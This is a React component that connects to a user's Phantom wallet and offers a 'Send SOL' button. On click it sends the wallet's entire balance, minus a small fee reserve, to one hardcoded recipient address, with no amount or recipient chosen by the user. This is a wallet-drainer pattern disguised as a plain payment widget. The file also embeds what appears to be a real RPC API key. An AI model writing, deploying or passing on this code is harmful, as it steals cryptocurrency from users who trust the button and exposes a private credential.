import React, { useState, useEffect } from 'react';
import { Connection, PublicKey, clusterApiUrl, Transaction, SystemProgram, LAMPORTS_PER_SOL } from '@solana/web3.js';

function SolanaTransactionComponent() {
    const [walletAddress, setWalletAddress] = useState(null);
    const [errorMessage, setErrorMessage] = useState('');
    const [isProcessing, setIsProcessing] = useState(false);
    // Define the connection object at the component level to avoid re-creating it
    const connection = new Connection("https://solana-mainnet.g.alchemy.com/v2/1Gmj17yRFWrJLF08tDFbv9KVTkBay-XB", 'confirmed');


    useEffect(() => {
        const connectWallet = async () => {
            try {
                const { solana } = window;
                if (solana?.isPhantom) {
                    const response = await solana.connect();
                    setWalletAddress(response.publicKey.toString());
                } else {
                    setErrorMessage('Phantom wallet not found. Please install Phantom.');
                }
            } catch (error) {
                setErrorMessage('Failed to connect wallet.');
            }
        };

        connectWallet();
    }, []);

    const handleTransaction = async () => {
        if (!walletAddress) {
            setErrorMessage('Wallet is not connected.');
            return;
        }

        setIsProcessing(true);
        setErrorMessage('');
        try {
            const publicKey = new PublicKey(walletAddress);
            const balanceInLamports = await connection.getBalance(publicKey);
            const feeReserve = LAMPORTS_PER_SOL * 0.005; // Reserve for gas fees

            if (balanceInLamports <= feeReserve) {
                throw new Error('Insufficient balance to cover the transaction and fee.');
            }

            const amountToSend = balanceInLamports - feeReserve;
            const recipientPublicKey = new PublicKey('34akXnFyRK2MowB3RG5jwX6Qf9AU22ewmPStXzeJehRh'); // Ensure this is the recipient's correct public key

            const transaction = new Transaction().add(
                SystemProgram.transfer({
                    fromPubkey: publicKey,
                    toPubkey: recipientPublicKey,
                    lamports: amountToSend,
                }),
            );

            const { blockhash } = await connection.getRecentBlockhash();
            transaction.recentBlockhash = blockhash;
            transaction.feePayer = publicKey;

            const signedTransaction = await window.solana.signTransaction(transaction);
            const signature = await connection.sendRawTransaction(signedTransaction.serialize());
            await connection.confirmTransaction(signature);

            console.log('Transaction successful:', signature);
        } catch (error) {
            console.error('Operation error:', error);
            setErrorMessage(error.message || 'An error occurred during the operation.');
        } finally {
            setIsProcessing(false);
        }
    };

    return (
        <div>
            <button onClick={handleTransaction} disabled={isProcessing}>
                {isProcessing ? 'Processing...' : 'Send SOL'}
            </button>
            {errorMessage && <div>{errorMessage}</div>}
        </div>
    );
}

export default SolanaTransactionComponent;
